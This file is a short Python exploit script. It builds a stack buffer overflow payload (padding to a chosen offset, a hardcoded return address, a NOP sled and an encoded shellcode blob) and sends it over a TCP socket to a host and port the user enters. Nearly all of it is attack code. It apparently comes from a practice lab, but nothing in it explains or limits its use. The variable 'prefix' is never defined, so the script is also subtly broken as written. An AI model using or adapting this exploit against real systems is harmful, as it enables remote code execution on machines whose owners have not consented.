import socket
import time

# --------------init Payload-----------------
Host = input("Enter a host: ")
Port = int(input("Enter a port: "))
offset = int(input("Please enter an offset for overflow: "))

fuzz = "A"*offset
retn = "\xd3\x11\x50\x62"
padding = "\x90"*20 
payload = ("\xda\xdc\xbd\xed\xe7\x73\x27\xd9\x74\x24\xf4\x5e\x33\xc9\xb1"
"\x52\x31\x6e\x17\x83\xc6\x04\x03\x83\xf4\x91\xd2\xa7\x13\xd7"
"\x1d\x57\xe4\xb8\x94\xb2\xd5\xf8\xc3\xb7\x46\xc9\x80\x95\x6a"
"\xa2\xc5\x0d\xf8\xc6\xc1\x22\x49\x6c\x34\x0d\x4a\xdd\x04\x0c"
"\xc8\x1c\x59\xee\xf1\xee\xac\xef\x36\x12\x5c\xbd\xef\x58\xf3"
"\x51\x9b\x15\xc8\xda\xd7\xb8\x48\x3f\xaf\xbb\x79\xee\xbb\xe5"
"\x59\x11\x6f\x9e\xd3\x09\x6c\x9b\xaa\xa2\x46\x57\x2d\x62\x97"
"\x98\x82\x4b\x17\x6b\xda\x8c\x90\x94\xa9\xe4\xe2\x29\xaa\x33"
"\x98\xf5\x3f\xa7\x3a\x7d\xe7\x03\xba\x52\x7e\xc0\xb0\x1f\xf4"
"\x8e\xd4\x9e\xd9\xa5\xe1\x2b\xdc\x69\x60\x6f\xfb\xad\x28\x2b"
"\x62\xf4\x94\x9a\x9b\xe6\x76\x42\x3e\x6d\x9a\x97\x33\x2c\xf3"
"\x54\x7e\xce\x03\xf3\x09\xbd\x31\x5c\xa2\x29\x7a\x15\x6c\xae"
"\x7d\x0c\xc8\x20\x80\xaf\x29\x69\x47\xfb\x79\x01\x6e\x84\x11"
"\xd1\x8f\x51\xb5\x81\x3f\x0a\x76\x71\x80\xfa\x1e\x9b\x0f\x24"
"\x3e\xa4\xc5\x4d\xd5\x5f\x8e\x7b\x23\x7c\xa2\x14\x31\x82\x2b"
"\xb9\xbc\x64\x21\x51\xe9\x3f\xde\xc8\xb0\xcb\x7f\x14\x6f\xb6"
"\x40\x9e\x9c\x47\x0e\x57\xe8\x5b\xe7\x97\xa7\x01\xae\xa8\x1d"
"\x2d\x2c\x3a\xfa\xad\x3b\x27\x55\xfa\x6c\x99\xac\x6e\x81\x80"
"\x06\x8c\x58\x54\x60\x14\x87\xa5\x6f\x95\x4a\x91\x4b\x85\x92"
"\x1a\xd0\xf1\x4a\x4d\x8e\xaf\x2c\x27\x60\x19\xe7\x94\x2a\xcd"
"\x7e\xd7\xec\x8b\x7e\x32\x9b\x73\xce\xeb\xda\x8c\xff\x7b\xeb"
"\xf5\x1d\x1c\x14\x2c\xa6\x3c\xf7\xe4\xd3\xd4\xae\x6d\x5e\xb9"
"\x50\x58\x9d\xc4\xd2\x68\x5e\x33\xca\x19\x5b\x7f\x4c\xf2\x11"
"\x10\x39\xf4\x86\x11\x68")
postfix = ""

buf = prefix + fuzz + retn + padding + payload + postfix
print(buf)
#--------------------------------------------

#----------------init socket-----------------
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Creating socket

print("[+]Connecting to host...")
time.sleep(2)

try:
    s.connect((Host, Port)) #Checking to see if connection was successfull

except OSError as msg:
    s.close()
    s = None

if s is None:
    print("[-]Something went wrong. Please try again.")
else:
    print("[+]Connection successful...")
    time.sleep(1)
    print("[+]Sending payload...")
    s.sendall(bytes(buf + "\r\n", "latin-1"))
    data = s.recv(1024)

print('Recieved', repr(data)) #Receving data back

#--------------------------------------------
